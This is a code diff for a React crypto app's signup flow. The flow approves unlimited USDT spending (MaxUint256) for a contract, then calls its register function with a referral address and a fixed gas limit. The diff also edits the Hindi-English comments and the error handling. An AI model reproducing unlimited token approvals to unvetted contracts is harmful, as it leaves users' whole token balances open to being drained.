@@ -45,22 +45,26 @@ function App() {
       const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
       const coreContract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
       
-      // 1. PEHLE: Unlimited Approval (MaxUint256)
+      // 1. Approval
       const approveTx = await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.MaxUint256);
-      await approveTx.wait(); 
+      await approveTx.wait();
       
-      // 2. BAAD MEIN: Register call
+      // 2. Registration with High Gas Limit
       const ref = (referralInput && ethers.isAddress(referralInput)) ? referralInput : "0x0000000000000000000000000000000000000000";
-      const regTx = await coreContract.register(ref);
+      console.log("Attempting registration with:", ref);
+      
+      // Yahan gas limit 800,000 di hai taaki contract logic fail na ho
+      const regTx = await coreContract.register(ref, { gasLimit: 800000 });
       await regTx.wait();
       
       setIsRegistered(true);
       fetchHistory(await signer.getAddress(), provider);
       alert("Registration Successful!");
     } catch (e) { 
-      const errorMessage = e.reason || e.message || "Unknown Error";
-      console.error("Full Error:", e);
-      alert("Signup Failed: " + errorMessage); 
+      // Console mein error dekho
+      console.error("DEBUG ERROR:", e);
+      // Agar error revert hai, to uska 'data' ya 'reason' console mein dikhega
+      alert("Signup Failed! Error code: " + e.code); 
     }
     setLoading(false);
   };
